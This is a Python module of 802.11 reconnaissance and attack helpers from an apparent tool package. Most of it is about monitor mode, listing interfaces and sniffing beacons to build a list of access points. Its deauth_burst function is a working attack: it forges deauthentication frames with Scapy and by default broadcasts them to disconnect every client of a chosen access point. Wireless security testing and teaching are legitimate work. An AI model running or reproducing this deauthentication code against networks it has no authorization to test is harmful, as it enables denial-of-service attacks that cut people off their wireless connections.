"""Wireless module: 802.11 reconnaissance and attack helpers.

Designed for Linux. Uses Scapy's layer-2 radio functions when a monitoring
interface is available and shelling out to `iw`/`airmon-ng`/`networks` where
needed. Everything degrades gracefully when the required privileges or
hardware are missing.
"""

from __future__ import annotations

import re
import subprocess
import time
from dataclasses import dataclass, field

from backrooms.core.exceptions import WirelessError


@dataclass
class AccessPoint:
    """A wireless access point discovered by scanning."""

    bssid: str
    ssid: str
    channel: int = 0
    signal_dbm: int | None = None
    encryption: str = "OPEN"
    privacy: bool = False

    @property
    def label(self) -> str:
        return f"{self.ssid or '<hidden>'} ({self.bssid})"


@dataclass
class ScanResult:
    """Result of a wireless scan."""

    interface: str
    access_points: list[AccessPoint] = field(default_factory=list)

    @property
    def total(self) -> int:
        return len(self.access_points)


def interface_in_monitor(interface: str) -> bool:
    """Check whether a wireless interface is currently in monitor mode."""
    try:
        out = subprocess.run(
            ["iw", "dev"],  # noqa: S603, S607 - single trusted binary path
            capture_output=True,
            text=True,
            check=True,
            shell=False,
        ).stdout
    except (subprocess.SubprocessError, FileNotFoundError):
        return False
    block = _iw_block(out, interface)
    return bool(block and "type monitor" in block)


def set_monitor_mode(interface: str, enable: bool) -> None:
    """Bring a wireless interface into/out of monitor mode (requires root)."""
    mode = "monitor" if enable else "managed"
    try:
        subprocess.run(  # noqa: S603 - trusted binary, not user input
            ["iw", "dev", interface, "set", "type", mode],  # noqa: S607 - binary path
            check=True,
            shell=False,
        )
        if enable:
            subprocess.run(  # noqa: S603 - trusted binary, not user input
                ["iw", "dev", interface, "set", "channel", "0"],  # noqa: S607 - binary path
                check=False,
                shell=False,
            )
    except subprocess.SubprocessError as exc:
        raise WirelessError(f"Could not set {interface} to {mode}: {exc}") from exc
    except FileNotFoundError as exc:
        raise WirelessError("iw is not installed; install wireless-tools") from exc


def list_wireless_interfaces() -> list[str]:
    """Return the wireless interface names visible to iw."""
    try:
        out = subprocess.run(
            ["iw", "dev"],  # noqa: S603, S607 - single trusted binary path
            capture_output=True,
            text=True,
            check=True,
            shell=False,
        ).stdout
    except (subprocess.SubprocessError, FileNotFoundError):
        return []
    names = re.findall(r"^\s*Interface\s+(\S+)", out, flags=re.MULTILINE)
    return names or []


class _StopScan(Exception):  # noqa: N818 - internal control-flow exception
    pass


def scan_access_points(interface: str, timeout: float = 3.0) -> ScanResult:
    """Capture beacons on a monitor interface and build an AP list."""
    try:
        from scapy.all import conf, sniff
    except ImportError as exc:  # pragma: no cover
        raise WirelessError("Scapy is required for live beacon scanning: " + str(exc)) from exc

    seen: dict[str, AccessPoint] = {}
    collected: list[tuple[str, int, bool, str]] = []
    stop_after = time.time() + timeout

    def on_packet(pkt) -> None:  # type: ignore[no-untyped-def]
        if time.time() > stop_after:
            raise _StopScan
        if not pkt.haslayer("Dot11"):
            return
        if not (pkt.type == 0 and (pkt.subtype == 8 or pkt.subtype == 0)):
            # not a management beacon/probe-resp carrying identity
            return
        bssid = _mac(pkt.addr2)
        ssid, channel, privacy = _beacon_info(pkt)
        if bssid and ssid is not None:
            collected.append((ssid, channel, privacy, bssid))

    prev = conf.iface
    conf.iface = interface  # type: ignore[assignment]
    try:
        try:
            sniff(prn=on_packet, timeout=int(timeout) + 1, store=False)
        except _StopScan:
            pass
    finally:
        conf.iface = prev

    for ssid, channel, privacy, bssid in collected:
        seen.setdefault(
            bssid,
            AccessPoint(
                bssid=bssid,
                ssid=ssid,
                channel=channel,
                privacy=privacy,
                encryption="WPA2/3" if privacy else "OPEN",
            ),
        )
    return ScanResult(
        interface=interface, access_points=sorted(seen.values(), key=lambda ap: ap.bssid)
    )


def deauth_burst(
    target_bssid: str,
    victim_mac: str = "ff:ff:ff:ff:ff:ff",
    interface: str = "",
    count: int = 10,
) -> int:
    """Send a burst of 802.11 deauthentication frames (requires monitor mode)."""
    try:
        from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp  # type: ignore[attr-defined]
    except ImportError as exc:  # pragma: no cover
        raise WirelessError("Scapy is required for deauth: " + str(exc)) from exc

    frame = (
        RadioTap()
        / Dot11(type=0, subtype=12, addr1=victim_mac, addr2=target_bssid, addr3=target_bssid)
        / Dot11Deauth(reason=7)
    )
    sent = 0
    for _ in range(count):
        try:
            sendp(frame, iface=interface or None, verbose=False)
            sent += 1
        except (OSError, subprocess.SubprocessError):
            break
        time.sleep(0.05)
    return sent


def _iw_block(out: str, interface: str) -> str | None:
    """Slice the `iw dev` output block that belongs to `interface`."""
    blocks = re.split(r"(?m)^\s*phy#", out)
    for block in blocks:
        if f"Interface {interface}" in block:
            return block
    if out.count(f"Interface {interface}") == 1:
        return out[out.index(f"Interface {interface}"):]
    return None


def _mac(addr: tuple[int, ...] | None) -> str:
    """Normalise a Scapy address tuple into a colon-separated MAC string."""
    if not addr:
        return ""
    if isinstance(addr, str):
        return addr
    try:
        return ":".join(f"{b:02x}" for b in addr)
    except (TypeError, ValueError):
        return str(addr)


def _beacon_info(pkt) -> tuple[str | None, int, bool]:  # type: ignore[no-untyped-def]
    """Extract SSID/channel/privacy from a Dot11 frame, best effort."""
    ssid = None
    channel = 0
    privacy = False
    try:
        if pkt.haslayer("Dot11ProbeResp") and pkt.info:
            ssid = pkt.info.decode(errors="replace")
        if pkt.haslayer("Dot11Elt"):
            for elt in pkt.getlayer("Dot11Elt").iterpayloads():
                if elt.ID == 0 and isinstance(elt.info, bytes):
                    try:
                        ssid = elt.info.decode("utf-8", errors="replace")
                    except (AttributeError, ValueError):
                        pass
                elif elt.ID == 3 and isinstance(elt.info, bytes) and len(elt.info) >= 1:
                    channel = elt.info[0]
        privacy = bool(pkt.getlayer("Dot11Elt") and _privacy_flag(pkt))
    except (AttributeError, ValueError, TypeError, IndexError):
        pass
    return ssid, channel, privacy


def _privacy_flag(pkt) -> bool:  # type: ignore[no-untyped-def]
    for elt in pkt.getlayer("Dot11Elt").iterpayloads():
        if elt.ID == 48 or elt.ID == 0x30:  # RSN -> WPA2/3
            return True
    return False
